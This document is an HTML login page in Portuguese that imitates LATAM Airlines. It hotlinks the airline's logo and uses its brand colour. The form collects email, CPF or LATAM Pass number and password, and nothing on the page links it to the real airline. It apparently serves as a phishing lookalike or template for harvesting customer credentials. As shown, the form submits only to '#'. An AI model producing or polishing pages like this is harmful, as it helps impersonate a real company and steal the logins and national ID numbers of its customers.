<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faça seu Login | LATAM AIRLINES</title>
    <link rel="icon" href="https://th.bing.com/th/id/OIP.pawmiYLYxeNk4mrlvyIlqAHaL4?

rs=1&pid=ImgDetMain">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 50%;
            margin: 100px auto;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        form {
            text-align: center;
        }
        form input {
            margin-bottom: 10px;
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        form textarea {
            margin-bottom: 10px;
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
        }
        form button {
            width: 150px; /* Defina o tamanho desejado */
            padding: 10px;
            background-color: rgb(232, 17, 75);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 auto; /* Centraliza o botão horizontalmente */
            display: block; /* Para que a margem funcione */
        }
        .logo {
            width: 100px; /* Defina o tamanho desejado */
            margin: 0 auto 20px; /* Centraliza a imagem e adiciona margem inferior */
            display: block; /* Para que a margem funcione */
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="#" method="post">
            <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?

rik=9EVDOKvltMk8Kg&amp;riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads

%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&amp;ehk=KoMMi4amEshpJz3dL4OUfFcHwZ

%2b32OLiAE591EJWXs4%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="Logo da LATAM Airlines" 

class="logo">
            <p>Insira seu usuário:</p>
<p>Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
            <input type="email" name="usuario" placeholder="Email, CPF ou Número de 

cliente">
            <input type="password" name="senha" placeholder="Senha">
            <button type="submit">Continuar</button>
        </form>
    </div>
</body>
</html>
